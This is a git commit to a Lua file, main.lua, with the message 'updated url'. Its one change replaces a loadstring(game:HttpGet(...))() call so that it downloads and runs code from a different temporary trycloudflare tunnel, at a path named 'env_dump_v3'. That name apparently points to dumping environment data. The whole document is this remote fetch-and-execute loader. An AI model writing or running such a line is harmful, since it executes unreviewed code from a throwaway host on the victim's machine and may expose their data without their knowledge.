3bfc61491ab8d20f77ba18f9e23f0e50b2ddec04
Cipher <75399147+Cipher3569@users.noreply.github.com>
2026-09-25 19:03:30 -0400

    updated url

--- main.lua
+++ main.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://elements-raleigh-pennsylvania-shareholders.trycloudflare.com/env_dump_v3"))()
+loadstring(game:HttpGet("https://ticket-urge-chassis-something.trycloudflare.com/env_dump_v3"))()
